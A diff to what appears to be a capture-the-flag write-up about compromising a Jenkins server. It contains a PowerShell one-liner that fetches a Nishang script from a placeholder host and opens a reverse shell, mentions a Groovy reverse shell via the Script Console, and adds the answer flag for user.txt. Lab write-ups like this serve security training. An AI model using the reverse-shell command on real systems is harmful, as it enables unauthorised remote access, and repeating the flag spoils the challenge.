@@ -154,7 +154,7 @@ nothing really usable.
 
 
 
-Q4: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
+Q3: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
 ```
@@ -204,6 +204,9 @@ PS C:\Program Files (x86)\Jenkins\workspace\project> type c:\users\bruce\desktop
 PS C:\Program Files (x86)\Jenkins\workspace\project> 
 
 ```
+
+## Q4 What is the user.txt flag? 
+Answer: 79007a09481963edf2e1321abd9ae2a0
 
 Another alternative was to use the “Manage Jenkins” option and then open the Script Console, where a Groovy script, a language somewhere between Java and Python, which is required by script window. A reverse shell example can be found in online resources, allowing a connection in a more simplified way compared to using the Nishang toolkit. After selecting Run, it will connect back to your netcat listener. I will connect back to a regular windows command line. but can be changed to powershell easy enough if required.
 
